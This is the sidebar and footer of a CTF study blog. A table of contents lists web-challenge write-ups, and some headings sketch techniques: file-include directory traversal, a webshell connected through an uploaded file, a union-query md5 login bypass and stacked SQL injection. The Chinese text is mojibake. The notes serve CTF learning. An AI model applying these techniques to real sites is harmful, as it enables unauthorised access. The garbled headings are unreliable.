          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="nav-number">1.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">2.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#include-REQUEST-%E2%80%98file%E2%80%99-%E5%8E%9F%E7%90%86%E6%98%AFhint-php-%E8%A2%AB%E5%BD%93%E4%BD%9C%E7%9B%AE%E5%BD%95%EF%BC%8C%E4%B9%8B%E5%90%8E%E4%B8%8A%E8%B7%B3%E7%9B%AE%E5%BD%95%E5%B0%B1%E5%A5%BD%E4%BA%86%EF%BC%88%E8%BF%99%E4%B8%AA%E5%8F%AA%E9%80%82%E7%94%A8%E4%BA%8Elinux%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">include $_REQUEST[â€˜fileâ€™];  åŸç†æ˜¯hint.php?&#x2F;è¢«å½“ä½œç›®å½•ï¼Œä¹‹åä¸Šè·³ç›®å½•å°±å¥½äº†ï¼ˆè¿™ä¸ªåªé€‚ç”¨äºlinuxï¼‰</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="nav-number">3.</span> <span class="nav-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-number">4.</span> <span class="nav-text">[ACTF2020 æ–°ç”Ÿèµ›]Include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">5.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number"></span> <span class="nav-text">Upload Labs</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="nav-number">0.1.</span> <span class="nav-text">è§£é¢˜æ­¥éª¤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%8E%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E9%83%BD%E4%BC%9A%E8%A2%AB%E5%8C%85%E5%90%AB%E5%9C%A8%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95%E7%9A%84index-php%E6%96%87%E4%BB%B6%E4%B8%AD%EF%BC%8C%E7%94%A8index-php%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91%EF%BC%8C%E6%88%90%E5%8A%9F%E5%BE%97%E5%88%B0flag%E3%80%82"><span class="nav-number">0.2.</span> <span class="nav-text">ä»é¢˜ç›®ä¸­å¯ä»¥çŸ¥é“ä¸Šä¼ çš„æ–‡ä»¶éƒ½ä¼šè¢«åŒ…å«åœ¨ä¸Šä¼ ç›®å½•çš„index.phpæ–‡ä»¶ä¸­ï¼Œç”¨index.phpè¿æ¥èšå‰‘ï¼ŒæˆåŠŸå¾—åˆ°flagã€‚</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="nav-number">1.</span> <span class="nav-text">[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GXYCTF2019-BabySQli"><span class="nav-number">2.</span> <span class="nav-text">[GXYCTF2019]BabySQli</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AC%E9%A2%98%E8%80%83%E7%82%B9%EF%BC%9A%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%97%B6%EF%BC%8C%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E4%BC%9A%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E8%99%9A%E6%8B%9F%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E4%BD%86%E5%88%B7%E6%96%B0%E4%B9%8B%E5%90%8E%E4%BC%9A%E6%B6%88%E5%A4%B1%EF%BC%8C%E6%9F%A5%E8%AF%A2%E5%8F%AF%E4%BB%A5%E6%9F%A5%E5%88%B0%E3%80%82%E5%AF%86%E7%A0%81%E9%AA%8C%E8%AF%81%E4%B8%80%E8%88%AC%E9%83%BD%E6%98%AFmd5%E9%AA%8C%E8%AF%81%E3%80%82"><span class="nav-number">2.1.</span> <span class="nav-text">æœ¬é¢˜è€ƒç‚¹ï¼šè”åˆæŸ¥è¯¢æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ï¼Œä½†åˆ·æ–°ä¹‹åä¼šæ¶ˆå¤±ï¼ŒæŸ¥è¯¢å¯ä»¥æŸ¥åˆ°ã€‚å¯†ç éªŒè¯ä¸€èˆ¬éƒ½æ˜¯md5éªŒè¯ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%A5%E4%B8%8B%E9%87%8C%E5%B0%B1%E6%98%AF%E8%A6%81%E7%BB%95%E8%BF%87%E5%AF%86%E7%A0%81%E7%9A%84md5%E9%AA%8C%E8%AF%81%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8A%8A%E6%88%91%E4%BB%AC%E8%BE%93%E5%85%A5%E7%9A%84%E5%80%BC%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E9%87%8C%E9%9D%A2%E5%AD%98%E6%94%BE%E7%9A%84%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83%EF%BC%8C%E9%82%A3%E8%A6%81%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E5%91%A2%EF%BC%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E7%94%A8%E6%9D%A5%E7%94%9F%E6%88%90%E8%99%9A%E6%8B%9F%E7%9A%84%E8%A1%A8%E6%95%B0%E6%8D%AE"><span class="nav-number">2.2.</span> <span class="nav-text">æ¥ä¸‹é‡Œå°±æ˜¯è¦ç»•è¿‡å¯†ç çš„md5éªŒè¯ï¼Œéœ€è¦æŠŠæˆ‘ä»¬è¾“å…¥çš„å€¼å’Œæ•°æ®åº“é‡Œé¢å­˜æ”¾çš„ç”¨æˆ·å¯†ç çš„md5å€¼è¿›è¡Œæ¯”è¾ƒï¼Œé‚£è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿå¯ä»¥ç”¨è”åˆæŸ¥è¯¢è¯­å¥ç”¨æ¥ç”Ÿæˆè™šæ‹Ÿçš„è¡¨æ•°æ®</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GYCTF2020-Blacklist"><span class="nav-number">3.</span> <span class="nav-text">[GYCTF2020]Blacklist</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">ä½¿ç”¨å †å æ³¨å…¥</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#desc%E6%9F%A5%E7%9C%8B%E8%A1%A8%E7%BB%93%E6%9E%84%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="nav-number">3.2.</span> <span class="nav-text">descæŸ¥çœ‹è¡¨ç»“æ„çš„è¯¦ç»†ä¿¡æ¯</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook-%E6%9C%AA%E8%A7%A3%E5%85%A8"><span class="nav-number">4.</span> <span class="nav-text">[ç½‘é¼æ¯ 2018]Fakebook(æœªè§£å…¨)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BE%A1%E5%89%91%E6%89%AB%E6%8F%8F%EF%BC%9A%E7%BA%BF%E7%A8%8B1%EF%BC%8C%E8%B6%85%E6%97%B630%EF%BC%8C%E7%BA%BF%E7%A8%8B%E6%95%B0%E5%A4%AA%E5%A4%A7%E4%BC%9A%E8%BF%94%E5%9B%9E409%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%A4%AA%E5%A4%9A%E3%80%82"><span class="nav-number">4.1.</span> <span class="nav-text">å¾¡å‰‘æ‰«æï¼šçº¿ç¨‹1ï¼Œè¶…æ—¶30ï¼Œçº¿ç¨‹æ•°å¤ªå¤§ä¼šè¿”å›409ï¼Œè®¿é—®å¤ªå¤šã€‚</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GXYCTF2019-BabyUpload"><span class="nav-number">5.</span> <span class="nav-text">[GXYCTF2019]BabyUpload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number">6.</span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">7.</span> <span class="nav-text">[BUUCTF 2018]Online Tool</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="N9-zqc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">N9-zqc</p>
  <div class="site-description" itemprop="description">ä¸»è¦æœ‰å…³ctfçš„å­¦ä¹ ç¬”è®°,ä¸»æ”»é€†å‘å’ŒWeb</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">N9-zqc</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
